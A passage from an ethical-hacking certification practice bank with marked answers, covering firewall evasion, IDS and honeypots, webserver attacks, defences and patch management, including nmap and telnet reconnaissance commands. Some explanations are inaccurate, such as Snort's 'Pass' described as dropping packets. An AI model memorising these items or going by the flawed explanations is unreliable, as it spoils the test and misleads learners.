> + **Source Routing:** In this,the sender of the packet designates the route (partially or entirely) that a packet should take through the network in such a way that the designated route should bypass the firewall node.
> + Where as **Firewalking** is a method of collecting information about remote networks behind firewalls. It is a technique that uses TTL values to determine gateway ACL filters and map networks by analyzing IP packet response. It probes ACLs on packet filtering routers/firewalls using the same method as tracerouting. Firewalking involves sending TCP or UDP packets into the firewall with TTL value is one hop greater than the targeted firewall. If the packet makes it through the gateway, the system forwards it to the next hop, where the TTL equals one and prompts an ICMP error message at the point of rejection with a "TTL exceeded in transit" message. This method helps locate a firewall, additional probing permits fingerprinting and identification of vulnerabilities.

439. Which of the following tools is used to execute commands of choice by tunneling them inside the payload of ICMP echo packets if ICMP is allowed through a firewall?
+ [ ] HTTPTunnel
+ [x] Loki
+ [ ] Anonymizer
+ [ ] AckCmd
> **Explanation:**
> + Anonymizer: Anonymous web-surfing sites help to browse the Internet anonymously and unblock blocked sites.
> + Loki ICMP tunneling is used to execute commands of choice by tunneling them inside the payload of ICMP echo packets.
> + AckCmd (http://ntsecurity.nu) use ACK tunneling.
> + HTTPTunnel uses technique of tunneling traffic across TCP port 80 to bypass firewall.

440. Which of the following is a two-way HTTP tunneling software tool that allows HTTP, HTTPS, and SOCKS tunneling of any TCP communication between any client–server systems?
+ [x] Super network tunnel
+ [ ] Secure Pipes
+ [ ] Loki
+ [ ] Bitvise
> **Explanation:**
> Super network tunnel is two-way HTTP tunneling software that connects two computers utilizing HTTP-tunnel client and HTTP-tunnel server. It can bypass any firewall to surf the web, use IM applications, games, and so on. Super network tunnel integrates SocksCap function along with bidirectional HTTP tunneling and remote control to simplify the configuration.
> 
> Bitvise and Secure Pipes are SSH tunneling tool and Loki is an ICMP tunneling tool.

441. Which feature of Secure Pipes tool open application communication ports to remote servers without opening those ports to public networks?
+ [x] Local forwards
+ [ ] Remote forwards
+ [ ] Remote backwards
+ [ ] SOCKS proxies
> **Explanation:**
> Local forwards open application communication ports to remote servers without opening those ports to public networks. It brings the security of VPN communication to clients and servers on an ad hoc basis without the configuration and management hassle.

442. An attacker sends an e-mail containing a malicious Microsoft office document to target WWW/FTP servers and embed Trojan horse files as software installation files, mobile phone software, and so on to lure a user to access them.  
Identify by which method the attacker is trying to bypass the firewall.
+ [ ] Bypassing firewall through MITM attack
+ [ ] Bypassing WAF using XSS attack
+ [ ] Bypassing firewall through external systems
+ [x] Bypassing firewall through content
> **Explanation:**
> + Bypassing firewall through external systems: Attackers can bypass firewall restrictions of target networks from an external system that can access the internal network.
> + Bypassing firewall through MITM attack: In MITM attacks, attackers make use of DNS servers and routing techniques to bypass firewall restrictions.
> + Bypassing firewall through content: In this method, the attacker sends the content containing malicious code to the user and tricks user to open it so that the malicious code can be executed.
> + Bypassing WAF using XSS attack: XSS attack exploits vulnerabilities that occur while processing input parameters of the end users and the server responses in a web application.

443. Which of the following is a hijacking technique where an attacker masquerades as a trusted host to conceal his identity, hijack browsers or websites, or gain unauthorized access to a network?
+ [ ] Port-scanning
+ [x] IP address spoofing
+ [ ] Source routing
+ [ ] Firewalking
> **Explanation:**
> IP address spoofing is a hijacking technique in which an attacker masquerades as a trusted host to conceal his identity, spoof a website, hijack browsers, or gain unauthorized access to a network. In IP spoofing, the attacker creates IP packets by using a forged IP address and access the system or network without authorization. Attackers modify the address information in the IP packet header and the source address bits field to bypass the firewall. The attacker spoofs the messages; therefore, the destination host feels that it has come from a reliable source. Thus, the attacker succeeds in impersonating others’ identities with the help of IP spoofing.

444. Which term is used to refer service announcements provided by services in response to connection requests and often carry vendor’s version of information?
+ [x] Banner
+ [ ] Network discovery phase
+ [ ] Scanning phase
+ [ ] Port
> **Explanation:**
> + **Port:** Through ports computers send or accept information from network resources.
> + **Network discovery** phase and a scanning phase are two phases involved in Firewalking.
> + **Banner** is used to refer to service announcements provided by services in response to connection requests and often carry vendor’s version of information.


## IDS/Firewall Solutions and Countermeasures
445. Jamie is an on-call security analyst. He had a contract to improve security for the company’s firewall. Jamie focused specifically on some of the items on the security of the Company’s firewall.
After working for some time on the items, Jamie creates the following list to fix them: 
	1. Set ssh timeout to 30 minutes.
	2. Set telnet timeout to 30 minutes.
	3. Set console timeout to 30 minutes.
	4. Set login password retry lockout.
Which task should Jamie perform if he has time for just one change before leaving the organization?
+ [ ] Set telnet timeout to 30 minutes.
+ [ ] Set console timeout to 30 minutes.
+ [x] Set login password retry lockout.
+ [ ] Set ssh timeout to 30 minutes.
> **Explanation:**
> The only option that protects against a potential attacker is the lockout setting. The other features assume you are logged in and leave a session logged in.

446. Which honeypot detection tools has following features:
+ Checks lists of HTTPS, SOCKS4, and SOCKS5 proxies with any ports
+ Checks several remote or local proxylists at once Can upload "Valid proxies" and "All except honeypots" files to FTP
+ Can process proxylists automatically every specified period
+ May be used for usual proxylist validating as well
+ [ ] Ostinato
+ [x] Send-Safe Honeypot Hunter
+ [ ] WireEdit
+ [ ] WAN Killer
> **Explanation:**
> Ostinato, WAN Killer and WireEdit are packet generating tools.
> 
> Send-Safe Honeypot Hunter is a tool designed for checking lists of HTTPS and SOCKS proxies for "honey pots.“
> 
> Following are some of the features of Send-Safe Honeypot Hunter :
> + Checks lists of HTTPS, SOCKS4, and SOCKS5 proxies with any ports
> + Checks several remote or local proxy lists at once
> + Can upload "Valid proxies" and "All except honeypots" files to FTP
> + Can process proxy lists automatically every specified period
> + May be used for usual proxy list validating as well

447. When an alert rule is matched in a network-based IDS like snort, the IDS does which of the following.
+ [x] Continues to evaluate the packet until all rules are checked
+ [ ] Stops checking rules, sends an alert, and lets the packet continue
+ [ ] Blocks the connection with the source IP address in the packet
+ [ ] Drops the packet and moves on to the next one
> **Explanation:**
> Snort is an open-source network intrusion detection system capable of performing real-time traffic analysis and packet logging on IP networks. Snort uses the popular libpcap library (for UNIX/Linux) or Winpcap (for Windows), the same library that tcpdump uses to perform its packet sniffing. Attaching snort in promiscuous mode to the network media decodes all the packets passing through the network. It generates alerts according to the content of individual packets and rules defined in the configuration file. When an alert rule is matched in a network-based IDS like snort, the IDS continues to evaluate the packet until all rules are checked.

448. In what way do the attackers identify the presence of layer 7 tar pits?
+ [ ] By looking at the IEEE standards for the current range of MAC addresses
+ [x] By looking at the latency of the response from the service
+ [ ] By looking at the responses with unique MAC address 0:0:f:ff:ff:ff
+ [ ] By analyzing the TCP window size
> **Explanation:**
> Tar pits are the security entities that are similar to honeypots that are designed to respond slowly to the incoming requests. The layer 7 tar pits react slowly to the incoming SMTP commands by the attackers/spammers. Attackers can identify the presence of layer 7 tar pits by looking at the latency of the response from the service.

449. Riya wants to defend against the polymorphic shellcode problem. What countermeasure should she take against this IDS evasion technique?
+ [ ] Catalog and review all inbound and outbound traffic
+ [x] Look for the nop opcode other than 0x90
+ [ ] Disable all FTP connections to or from the network
+ [ ] Configure a remote syslog server and apply strict measures to protect it from malicious users.
> **Explanation:**
> Riya should look for the nop opcode other than 0x90 to defend against the polymorphic shellcode problem. Rest of the countermeasures are used for firewall evasion.

450. Which of the following is not an action present in Snort IDS?
+ [ ] Log
+ [x] Audit
+ [ ] Pass
+ [ ] Alert
> **Explanation:**
> Snort performs the following actions:
> + Alert - Generate an alert using the selected alert method, and then log the packet
> + Log - Log the packet
> + Pass - Drop (ignore) the packet
> 
> Auditing is not an action of Snort since Snort is an IDS and not an Audit tool.

451. Siya is using a tool to defend critical data and applications without affecting performance and productivity. Following are the features of the tool:
+ Pre-built, real-time reports that display big-picture analyses on traffic, top applications, and filtered attack events.
+ Permits to see, control, and leverage the rules, shared services, and profiles of all the firewall devices throughout the network.
+ Comprises of in-line, bump-in-the-wire intrusion prevention system with layer two fallback capabilities.
+ Gives an overview of current performance for all HP systems in the network, including launch capabilities into targeted management applications by using monitors.
Identify the tool used by Siya-
+ [ ] Zimperium’s zIPS™
+ [ ] AlienVault® OSSIM™
+ [ ] Wifi Inspector
+ [x] TippingPoint IPS
> **Explanation:**
> TippingPoint IPS is in-line threat protection that defends critical data and applications without affecting performance and productivity. It contains over 8,700 security filters written to address zero-day and known vulnerabilities. TippingPoint IPS consists of both inbound/outbound traffic inspection, as well as application-level security capabilities.
> 
> It has the following features:
> + Pre-built, real-time reports that display big-picture analyses on traffic, top applications, and filtered attack events
> + Permits to see, control, and leverage the rules, shared services, and profiles of all the firewall devices throughout the network
> + Comprises of in-line, bump-in-the-wire intrusion prevention system with layer two fallback capabilities
> + Gives an overview of current performance for all HP systems in the network, including launch capabilities into targeted management applications by using monitors
> 
> Rest of the tools mentioned above are intrusion detection tools for mobile platform.

452. Which of the following firewalls is used to secure mobile device?
+ [ ] Glasswire
+ [ ] Comodo firewall
+ [ ] TinyWall
+ [x] NetPatch firewall
> **Explanation:**
> NetPatch firewall is a full-featured advanced android noroot firewall. It can be used to fully control over mobile device network. With NetPatch firewall, you can create network rules based on APP, IP address, domain name, and so on. This firewall is designed to save mobile device’s network traffic and battery consumption, and improve network security and protect privacy.
> 
> Comodo firewall, Glasswire and TinyWall are not used for mobile devices.

453. Manav wants to simulate a complete system and provide an appealing target to push hackers away from the production systems of his organization. By using some honeypot detection tool, he offers typical Internet services such as SMTP, FTP, POP3, HTTP, and TELNET, which appear perfectly normal to attackers. However, it is a trap for an attacker by messing them so that he leaves some traces knowing that they had connected to a decoy system that does none of the things it appears to do; but instead, it logs everything and notifies the appropriate people. Can you identify the tool?
+ [ ] Glasswire
+ [ ] PeerBlock
+ [x] SPECTER
+ [ ] TinyWall
> **Explanation:**
> SPECTER is a honeypot. It automatically investigates attackers while they are still trying to break in. It provides massive amounts of decoy content, and it generates decoy programs that cannot leave hidden marks on the attacker's computer. Automated weekly online updates of the honeypot's content and vulnerability databases allow the honeypot to change regularly without user interaction.
> 
> Glasswire, TinyWall, and PeerBlock are firewall solutions.

454. Which of the following firewall solution tool has the following features:
+ Two-way firewall that monitors and blocks inbound as well as outbound traffic
+ Allows users to browse the web privately
+ Identity protection services help to prevent identity theft by guarding crucial data of the users. It also offers PC protection and data encryption
+ Through Do Not Track, it stops data-collecting companies from tracking the online users
+ Online Backup to backs up files and restores the data in the event of loss, theft, accidental deletion or disk failure
+ [ ] zIPS
+ [x] ZoneAlarm PRO FIREWALL 2018
+ [ ] Wifi Inspector
+ [ ] Vangaurd Enforcer
> **Explanation:**
> ZoneAlarm PRO Firewall blocks attackers and intruders from accessing your system. It monitors programs for suspicious behavior spotting and stopping new attacks that bypass traditional anti-virus protection. It prevents identity theft by guarding your data. It even erases your tracks allowing you to surf the web in complete privacy. Furthermore, it locks out attackers, blocks intrusions, and makes your PC invisible online. Also, it filters out an annoying and potentially dangerous email.
> 
> zIPS, Wifi Inspector, and Vangaurd Enforcer are IDS tools.

# 13. Hacking Webservers
## Webserver Concepts and Attacks
455. Which statement best describes a server type under an N-tier architecture?
+ [ ] A single server at a specific layer
+ [x] A group of servers with a unique role
+ [ ] A group of servers at a specific layer
+ [ ] A single server with a specific role
> **Explanation:**
> N-tier architecture is used to provide solutions on scalability, security, fault tolerance, reusability, and maintainability to support enterprise level client-server applications. N-tier architecture usually has three separate logical parts, each of which is located on a separate physical server. Here the main advantage in this architecture is that each part or a group of servers is responsible for specific functionality or role. In the N-tier architecture, several machines or clusters of machines are deployed, ensuring that services are provided without resources being shared and performing specific functionality.

456. Identify the component of the web server that provides storage on a different machine or a disk after the original disk is filled-up?
+ [ ] Virtual hosting
+ [ ] Server root
+ [ ] Document root
+ [x] Virtual document tree
> **Explanation:**
> **Server Root**: It is the top-level root directory under the directory tree in which the server’s configuration and error, executable, and log files are stored. It consists of the code that implements the server.
> 
> **Document Root**: Document root is one of the web server’s root file directories that stores critical HTML files related to the web pages of a domain name that will serve in response to the requests.
> 
> **Virtual Hosting**: It is a technique of hosting multiple domains or websites on the same server. This allows sharing of resources between various servers. It is employed in large-scale companies where the company resources are intended to be accessed and managed globally.
> 
> **Virtual Document Tree**: Virtual document tree provides storage on a different machine or a disk after the original disk is filled-up. It is case sensitive and can be used to provide object-level security.

457. Which of the following stores critical HTML files related to the webpages of a domain name that will be served in response to requests?
+ [x] Document root
+ [ ] Web proxy
+ [ ] Virtual document tree
+ [ ] Server root
> **Explanation:**
> Document root is one of the webserver’s root file directories that stores critical HTML files related to the webpages of a domain name that will serve in response to requests. For example, if the requested URL is www.certifiedhacker.com and the document root is named as certroot and is stored in /admin/web directory, then /admin/web/certroot is the document directory address. If the complete request is www.certifiedhacker.com/P-folio/index.html, the server will search for the file path /admin/web/certroot/P-folio/index.html.

458. Which of the following stores a server’s configuration, error, executable, and log files?
+ [ ] Document root
+ [ ] Virtual document tree
+ [ ] Web proxy
+ [x] Server root
> **Explanation:**
> Server root is the top-level root directory under the directory tree in which the server’s configuration and error, executable, and log files are stored. It consists of the code that implements the server. The server root, in general, consists of four files where one file is dedicated to the code that implements the server and other three are subdirectories, namely, -conf, -logs, and -cgi-bin used for configuration information, store logs, and executables, respectively.

459. Which of the following provides storage on a different machine or disk after the original disk is filled up?
+ [ ] Server root
+ [x] Virtual document tree
+ [ ] Virtual hosting
+ [ ] Document root
> **Explanation:**
> Virtual document tree provides storage on a different machine or a disk after the original disk is filled up. It is case sensitive and can be used to provide object-level security. In the example under document root, for a request of www.certifiedhacker.com/P-folio/index.html, the server can also search for the file path /admin/web/certroot/P-folio/index.html if admin/web/certroot is stored in another disk.

460. An attacker sends numerous fake requests to the webserver from various random systems that results in the webserver crashing or becoming unavailable to the legitimate users. Which attack did the attacker perform?
+ [x] DoS attack
+ [ ] DNS server hijacking
+ [ ] HTTP response splitting attack
+ [ ] DNS amplification attack
> **Explanation:**
> A DoS/DDoS attack involves flooding targets with numerous fake requests so that the target stops functioning and will be unavailable to the legitimate users. Using a webserver DoS/DDoS attack, an attacker attempts to take the webserver down or make it unavailable to the legitimate users. A webserver DoS/DDoS attack often targets high-profile webservers such as banks, credit card payment gateways, and even root name servers.

461. If an attacker compromises a DNS server and changes the DNS settings so that all the requests coming to the target webserver are redirected to his/her own malicious server, then which attack did he perform?
+ [ ] DoS attack
+ [ ] DNS amplification attack
+ [ ] HTTP response splitting attack
+ [x] DNS server hijacking
> **Explanation:**
> In a DNS server hijacking, an attacker compromises the DNS server and changes the mapping settings of the target DNS server to redirect traffic to a rogue DNS server so that it would redirect the user’s requests to the attacker’s rogue server. Thus, when the user types a legitimate URL in a browser, the settings will redirect the user’s request to the attacker’s fake site.

462. If an attacker uses ../ (dot-dot-slash) sequence to access restricted directories outside of the webserver root directory, then which attack did he perform?
+ [ ] HTTP response splitting attack
+ [ ] DNS amplification attack
+ [x] Directory traversal attack
+ [ ] DoS attack
> **Explanation:**
> Directory traversal is the exploitation of HTTP through which attackers can access restricted directories and execute commands outside of the webserver’s root directory by manipulating a URL. In directory traversal attacks, attackers use ../ (dot-dot-slash) sequence to access restricted directories outside of the webserver’s root directory. Attackers can use the trial-and-error method to navigate outside of the root directory and access sensitive information in the system.

463. Which of the following attacks allows an attacker to access sensitive information by intercepting and altering communications between an end user and webservers?
+ [ ] Directory traversal attack
+ [ ] HTTP response splitting attack
+ [x] Man-in-the-middle attack
+ [ ] DoS attack
> **Explanation:**
> Man-in-the-middle (MITM) attacks allow an attacker to access sensitive information by intercepting and altering communications between an end user and webservers. In an MITM attack or sniffing attack, an intruder intercepts or modifies the messages exchanged between the user and webserver through eavesdropping or intruding into a connection.

464. Which of the following attacks occurs when an intruder maliciously alters the visual appearance of a webpage by inserting or substituting provocative, and frequently, offending data?
+ [ ] HTTP response splitting attack
+ [ ] Directory traversal attack
+ [ ] Man-in-the-middle attack
+ [x] Website defacement
> **Explanation:**
> Website defacement refers to the unauthorized changes made to the contents of a single webpage or an entire website, resulting in changes to the visual appearance of the website or a webpage. Hackers break into webservers and alter the hosted websites by injecting code in order to add images, popups, or text to a page in such a way that the visual appearance of the page changes. In some cases, the attackers may replace the entire website instead of just changing single pages.


## Webserver Attack Methodology
465. A security engineer at a medium-sized accounting firm has been tasked with discovering how much information can be obtained from the firm’s public facing webservers. The engineer decides to start by using netcat to port 80.  
The engineer receives this output:  
	```
	HTTP/1.1 200 OK  
	Server: Microsoft-IIS/6  
	Expires: Tue, 17 Jan 2017 01:41:33 GMT  
	Date: Mon, 16 Jan 2017 01:41:33 GMT  
	Content-Type: text/html  
	Accept-Ranges: bytes  
	Last-Modified: Wed, 28 Dec 2010 15:32:21 GMT  
	ETag: "b0aac0542e25c31:89d"  
	Content-Length: 7369  
	```
	Which of the following is an example of what the engineer performed?
+ [ ] SQL injection
+ [x] Banner grabbing
+ [ ] Whois database query
+ [ ] Cross-site scripting
> **Explanation:**
> XSS flaws occur whenever an application includes untrusted data in a new webpage without proper validation or escaping, or it updates an existing webpage with user supplied data using a browser API that can create JavaScript. XSS allows attackers to execute scripts in the victim’s browser that can hijack user sessions, deface websites, or redirect the user to malicious sites.  
> 
> Banner grabbing is the method used to determine the operating system running on a remote target system. It is also used for capturing and analyzing packets from the target and helps determine the OS used by the remote system.
> 
> SQL injection is the most common website vulnerability on the Internet, and is used to take advantage of nonvalidated input vulnerabilities to pass SQL commands through a web application for execution by a backend database.
> 
> Whois query returns information such as domain name details, contact details of domain owner, domain name servers, NetRange, and so on.

466. How can telnet be used to fingerprint a web server?
+ [x] telnet webserverAddress 80 HEAD / HTTP/1.0
+ [ ] telnet webserverAddress 80 HEAD / HTTP/2.0
+ [ ] telnet webserverAddress 80 PUT / HTTP/1.0
+ [ ] telnet webserverAddress 80 PUT / HTTP/2.0
> **Explanation:**
> The 80 specified in the telnet command is the port that you are hitting and the HEAD command “HEAD / HTTP/1.0” will return the header of the victim server to the Telnet screen.
> 
> The PUT / HTTP/1.0 command allows you to upload files, so cannot be used for fingerprinting. Remaining commands are invalid.

467. Which of the following tools is not used to perform webserver information gathering?
+ [ ] Netcraft
+ [ ] Whois
+ [x] Wireshark
+ [ ] Nmap
> **Explanation:**
> Among the options, Nmap, Netcraft and Whois are the tools used to perform footprinting of webservers, whereas Wireshark is a network sniffing tool.

468. Which of the following tools is not used to perform OS banner grabbing?
+ [ ] Nmap
+ [ ] Netcat
+ [ ] Telnet
+ [x] Wireshark
> **Explanation:**
> Nmap, Telnet, and Netcat are webserver information gathering tools and are capable of grabbing the operating system banners of the target machines. However, Wireshark is a network sniffer tool.

469. Which of the following commands does an attacker use to detect HTTP Trace?
+ [ ] `nmap -p80 --script http-userdir -enum localhost`
+ [ ] `nmap --script http-enum -p80 <host>`
+ [ ] `nmap --script hostmap <host>`
+ [x] ` nmap -p80 --script http-trace <host>`
> **Explanation:**
> Nmap along with Nmap Scripting Engine can extract lot of valuable information from the target web server. In addition to Nmap commands, Nmap Scripting Engine (NSE) provides scripts that reveal all sorts of useful information to an attacker from the target web server.
> 
> An attacker uses the following Nmap commands and NSE scripts to extract information:
> + `nmap -p80 --script http-trace <host>` command is used to detect HTTP Trace
> + `nmap -p80 --script http-userdir -enum localhost` command is used to enumerate users
> + `nmap --script hostmap <host>` command is used to discover virtual domains with hostmap
> + `nmap --script http-enum -p80 <host>` command is used to enumerate common web applications

470. Which of the following command does an attacker use to enumerate common web applications?
+ [ ] `nmap -p80 --script http-trace <host>`
+ [ ] `nmap -p80 --script http-userdir -enum localhost`
+ [x] `nmap --script http-enum -p80 <host>`
+ [ ] `nmap --script http-trace -p80 localhost`
> **Explanation:**
> + The `nmap --script http-enum -p80 <host>` command is used to enumerate common web applications
> + the `nmap -p80 --script http-userdir -enum localhost` command is used to enumerate users
> + the `nmap --script http-trace -p80 localhost` command is used to detect a vulnerable server that uses the TRACE method
> + the `nmap -p80 --script http-trace <host>` command is used to detect HTTP Trace.

471. Which of the following tools is used by an attacker to perform website mirroring?
+ [ ] Netcraft
+ [ ] Hydra
+ [x] HTTrack
+ [ ] Nessus
> **Explanation:**
> HTTrack is an offline browser utility that is capable of performing website mirroring by downloading a website from the Internet to a local directory, building all the directories recursively, and getting HTML, images, and other files from the server. Nessus is a vulnerability scanner, Hydra is a password cracking tool, and Netcraft is an information gathering tool.

472. An attacker wants to exploit a target machine. In order to do this, he needs to identify potential vulnerabilities that are present in the target machine. What tool should he use to achieve his objective?
+ [ ] Hydra
+ [ ] HTTrack
+ [x] Nessus
+ [ ] Netcraft
> **Explanation:**
> Nessus is the tool that can be used by the attacker to perform vulnerability scanning on the target machine. Hydra is a password cracking tool, Netcraft is an information gathering tool, and HTTrack is a website mirroring tool.

473. An attacker wants to perform a session hijacking attack. What tool should he use to achieve his objective?
+ [x] Burp Suite
+ [ ] Nessus
+ [ ] Netcraft
+ [ ] Hydra
> **Explanation:**
> Burp suite is the tool that the attacker should use to perform session hijacking. Nessus is a vulnerability scanner, Hydra is a password cracking tool, and Netcraft is an information gathering tool.

474. An attacker wants to crack passwords using attack techniques like brute-forcing, dictionary attack, and password guessing attack. What tool should he use to achieve his objective?
+ [ ] Netcraft
+ [x] Hydra
+ [ ] Burp suite
+ [ ] Nessus
> **Explanation:**
> Hydra is a password cracking tool that can be used by the attacker to crack passwords with brute-forcing, dictionary attack, and password guessing attack. Nessus is a vulnerability scanner, Burp suite is a session hijacking tool, and Netcraft is an information gathering tool.


## Countermeasures for Webserver Attacks
475. Which of the following tool determines the OS of the queried host by looking in detail at the network characteristics of the HTTP response received from the website?
+ [ ] Wireshark
+ [ ] Nmap
+ [x] Netcraft
+ [ ] Netcat
> **Explanation:**
> **Netcraft:** Netcraft determines the OS of the queried host by looking in detail at the network characteristics of the HTTP response received from the website. Netcraft identifies vulnerabilities in the web server via indirect methods: fingerprinting the OS, the software installed, and the configuration of that software gives enough information to determine whether the server may be vulnerable to an exploit.
> 
> **Nmap:** Nmap is a security scanner for network exploration and hacking. It allows you to discover hosts and services on a computer network, thus creating a "map" of the network. It sends specially crafted packets to the target host and then analyzes the responses to accomplish its goal.
> 
> **Wireshark:** Wireshark lets you capture and interactively browse the traffic running on a computer network. This tool uses Winpcap to capture packets on its own supported networks. It captures live network traffic from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, FDDI networks.
> 
> **Netcat:** Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable “back-end” tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool.

476. Which of the following is not a defensive measure for web server attacks while implementing Machine.config?
+ [x] Ensure that tracing is enabled <trace enable="true"/> and debug compiles are turned on
+ [ ] Restrict code access security policy settings
+ [ ] Limit inbound traffic to port 80 for HTTP and port 443 for HTTPS (SSL)
+ [ ] Encrypt or restrict intranet traffic
> **Explanation:**
> Machine.config is the mechanism of securing information by changing the machine level settings. This effect applies to all other applications. Machine.config file includes machine settings for the .Net framework that affects the security.
> 
> While implementing Machine.config, you must always ensure that tracing is disabled, that is, <trace enable="false"/>in order to defend against web server attacks, and meanwhile you must also ensure that the debug compiles are turned off.

477. Which of the following is not a defensive measure for web server attacks?
+ [ ] Limit inbound traffic to port 80 for HTTP and port 443 for HTTPS (SSL)
+ [x] Configure IIS to accept URLs with "../"
+ [ ] Encrypt or restrict intranet traffic
+ [ ] Ensure that protected resources are mapped to HttpForbiddenHandler and unused HttpModules are removed
> **Explanation:**
> While ensuring code access security, in order to avoid dictionary attacks on any web server, you have to configure the IIS to reject URLs with "../", and install new patches and updates. Configuring IIS to accept URLs with "../" allows attacks to perform dictionary attacks, directory traversal attacks, etc.

478. Which of the following security tools helps to prevent potentially harmful HTTP requests from reaching applications on the server?
+ [ ] Nessus
+ [ ] Netcraft
+ [ ] Nmap
+ [x] URLScan
> **Explanation:**
> UrlScan is a security tool that restricts the types of HTTP requests that IIS will process. By blocking specific HTTP requests, the UrlScan security tool helps to prevent potentially harmful requests from reaching applications on the server. UrlScan screens all incoming requests to the server by filtering the requests based on rules that are set by the administrator.

479. Which of the following is NOT a best approach to protect your firm against web server attacks?
+ [ ] Secure the SAM (Stand-alone Servers Only)
+ [x] Allow remote registry administration
+ [ ] Remove unnecessary ISAPI filters from the web server
+ [ ] Apply restricted ACLs
> **Explanation:**
> To defend web servers and provide security, you must remove unnecessary ISAPI filters from the web server, apply restricted ACLs, secure the SAM (stand-alone servers only), and block the remote registry administration.

480. Choose an ICANN accredited registrar and encourage them to set registrar-lock on the domain name in order to avoid which attack?
+ [x] DNS Hijacking Attack
+ [ ] Man-in-the-Middle Attack
+ [ ] Denial-of-Service Attack
+ [ ] Session Hijacking Attack
> **Explanation:**
> ICANN refers to Internet Corporation for Assigned Names and Numbers (ICANN). It helps coordinate the Internet Assigned Numbers Authority (IANA) functions, which are key technical services critical to the continued operations of the Internet's underlying address book, the Domain Name System (DNS). ICANN accredited registrars can be chosen in order to set registrar-lock on the domain name and avoid DNS-related attacks such as DNS hijacking attack.

481. Which of the following is NOT a best approach to protect your firm against web server files and directories?
+ [x] Enable serving of directory listings
+ [ ] Eliminate unnecessary files within the .jar files
+ [ ] Disable serving certain file types by creating a resource mapping
+ [ ] Avoid mapping virtual directories between two different servers, or over a network
> **Explanation:**
> To defend web server files and directories, you must eliminate unnecessary files within the .jar files, avoid mapping virtual directories between two different servers, or over a network, disable serving certain file types by creating a resource mapping, and also disable serving of directory listings.

482. Where should a web server be placed in a network in order to provide the most security?
+ [ ] Outside an unsecured network
+ [ ] Inside an unsecured network
+ [ ] Outside a secure network
+ [x] Inside DeMilitarized Zones (DMZ)
> **Explanation:**
> Web servers will not be safe outside a network and also inside an unsecure network. So, to defend the web servers and provide maximum security to web servers, they have to be placed inside demilitarized zones. In computer networks, the DMZ is an area that hosts computer(s) or a small sub-network placed as a neutral zone between a particular company’s internal network and untrusted external network to prevent outsider access to a company’s private data. The DMZ serves as a buffer between the secure internal network and the insecure Internet, as it adds a layer of security to the corporate LAN, thus preventing direct access to other parts of the network.

483. Attackers use GET and CONNECT requests to use vulnerable web servers as which of the following?
+ [ ] DNS Servers
+ [ ] None of the above
+ [ ] Application Servers
+ [x] Proxies
> **Explanation:**
> Sometimes, web servers are configured to perform functions such as forwarding or reverse HTTP proxy. Web servers with these functions enabled are employed by the attackers to perform following attacks:
> + Attacking third-party systems on internet
> + Connecting to arbitrary hosts on the organization’s internal network
> + Connecting back to other services running on the proxy host itself
> 
> Attackers use GET and CONNECT requests to use vulnerable web servers as proxies to connect and obtain information from target systems through these proxy web servers.

484. Which of the following is not a session hijacking technique?
+ [ ] Session sidejacking
+ [ ] Session fixation
+ [ ] Cross-site scripting
+ [x] DNS hijacking
> **Explanation:**
> Session fixation, session sidejacking, and cross-site scripting are some of the techniques for performing session hijacking, whereas DNS hijacking is not part of a session hijacking attack. DNS hijacking is a type of malicious attack that modifies or overrides a systems TCP/IP settings to redirect it at a rogue DNS server, thereby invalidating the default DNS settings.

485. Which of the following technique defends servers against blind response forgery?
+ [ ] Restriction of web application access to unique IPs
+ [x] UDP source port randomization
+ [ ] Removal of carriage returns (CRs) and linefeeds (LFs)
+ [ ] Disallow carriage return (%0d or \r) and line feed (%0a or \n) characters
> **Explanation:**
> UDP source port randomization technique defends servers against blind response forgery. Limit the number of simultaneous recursive queries and increase the times-to-live (TTL) of legitimate records.
> 
> Following are some of the methods to defend against HTTP response-splitting and web cache poisoning:
> 
> Server Admin:
> + Use latest web server software
> + Regularly update/patch OS and web server
> + Run web vulnerability scanner
> 
> Application Developers:
> + Restrict web application access to unique IPs
> + Disallow carriage return (%0d or \r) and line feed (%0a or \n) characters
> + Comply to RFC 2616 specifications for HTTP/1.1


## Patch Management
486. Which of the following teams has the responsibility to check for updates and patches regularly?
+ [ ] Red Team
+ [ ] Security software development team
+ [x] Patch management team
+ [ ] Vulnerability assessment team
> **Explanation:**
> In an organization, the patch management team is responsible for checking for updates and patches regularly. The security software development team is responsible for developing security-related software that can be used for testing the security infrastructure of the organization. The vulnerability assessment team is used to assess the vulnerabilities in an organization and the red team is a part of penetration testing team that provides security to the organization by performing offensive security methods.

487. A security administrator is looking for a patch management tool which scans the organization's network and manages security and non-security patches. Which of the following patch management tool, he/she can use in order to perform the required task?
+ [ ] Burp suite
+ [x] GFI LanGuard
+ [ ] Nikto
+ [ ] Netscan Pro
> **Explanation:**
> Among these, GFI LanGuard is the only patch management tool. It is a patch management tool that scans your network automatically and also installs and manages security and non-security patches. It supports machines across Microsoft®, MAC OS X®, and Linux® operating systems as well as many third-party applications.
> 
> Netscan Pro is a network scanning tool and Nikto is a vulnerability assessment tool. Burp suite is a session hijacking tool.

488. Which of the following is not a webserver security tool?
+ [ ] Retina CS
+ [ ] NetIQ Secure configuration manager
+ [ ] Fortify WebInspect
+ [x] Netcraft
> **Explanation:**
> Among these, Netcraft is an information gathering tool. Fortify WebInspect, Retina CS, and NetIQ secure configuration manager are webserver security tools.

489. Which of the following is not a patch management tool?
+ [ ] Symantec client management suite
+ [x] Burp suite
+ [ ] GFI LanGuard
+ [ ] Software vulnerability manager
> **Explanation:**
> Among these, Symantec client management suite, software vulnerability manager, and GFI LanGuard are patch management tools, whereas Burp suite is the only tool that is not a patch management tool. Burp suite is a session hijacking tool.

490. Which of the following is true for automated patch management process?
+ [ ] Acquire -> Assess -> Detect -> Deploy -> Test -> Maintain
+ [x] Detect -> Assess -> Acquire -> Test -> Deploy -> Maintain
+ [ ] Assess -> Detect -> Acquire -> Deploy -> Test -> Maintain
+ [ ] Acquire -> Assess -> Detect -> Test -> Deploy -> Maintain
> **Explanation:**
> In an automated patch management process, detect -> assess -> acquire -> test -> deploy -> maintain is the process that is followed.

491. Which of the following is considered as a repair job to a programming problem?
+ [x] Patch
+ [ ] Vulnerability
+ [ ] Assessment
+ [ ] Penetration Test
> **Explanation:**
> A patch can be considered as a repair job to a programming problem. It is the use of software designed to update a computer program or its supporting data to fix or improve it. This includes fixing security vulnerabilities and other bugs, with such patches usually being called as bug fixes. Patches improve the usability or the performance of software.

